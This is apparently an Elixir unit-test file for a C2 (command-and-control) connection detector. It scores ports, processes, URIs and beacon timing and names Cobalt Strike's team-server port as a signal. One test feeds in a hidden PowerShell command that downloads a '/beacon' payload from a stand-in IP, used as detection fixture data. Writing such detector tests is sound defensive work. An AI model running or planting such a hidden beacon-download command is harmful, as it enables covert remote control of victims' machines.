defmodule TamanduaServer.Detection.C2DetectorTest do
  use ExUnit.Case, async: true

  alias TamanduaServer.Detection.C2Detector

  describe "composite_connection_score/2" do
    test "does not alert on a common HTTPS port alone" do
      score =
        C2Detector.composite_connection_score(%{
          "remote_port" => 443,
          "process_name" => "chrome.exe",
          "domain" => "example.com"
        })

      refute score[:alertable?]
      assert score[:severity] == "info"
      assert score[:score] == 0.0
    end

    test "does not alert on Cobalt Strike team-server port alone" do
      score =
        C2Detector.composite_connection_score(%{
          "remote_port" => 50050,
          "process_name" => "chrome.exe"
        })

      refute score[:alertable?]
      assert score[:severity] == "info"
      assert score[:score] < 0.5
      assert Enum.any?(score[:signals], &(&1[:id] == :cobalt_strike_team_server_port))
    end

    test "alerts when beacon URI, suspicious process, and port evidence combine" do
      score =
        C2Detector.composite_connection_score(%{
          "remote_port" => 50050,
          "process_name" => "powershell.exe",
          "command_line" => "powershell.exe -nop -w hidden iwr http://198.51.100.10/beacon",
          "uri" => "/beacon",
          "bytes_sent" => 512,
          "bytes_received" => 16384
        })

      assert score[:alertable?]
      assert score[:severity] in ["medium", "high"]
      assert score[:medium_signal_count] >= 2
      assert Enum.any?(score[:signals], &(&1[:id] == :http_beacon_uri))
      assert Enum.any?(score[:signals], &(&1[:id] == :suspicious_process_context))
    end

    test "strong beacon timing plus context becomes high confidence" do
      score =
        C2Detector.composite_connection_score(
          %{
            "remote_port" => 443,
            "uri" => "/task",
            "user_agent" => "go-http-client/1.1"
          },
          [
            %{
              type: :c2_beacon_strong,
              confidence: 0.9
            }
          ]
        )

      assert score[:alertable?]
      assert score[:severity] == "high"
      assert score[:strong_signal_count] == 1
      assert Enum.any?(score[:signals], &(&1[:id] == :beacon_timing_strong))
    end
  end
end
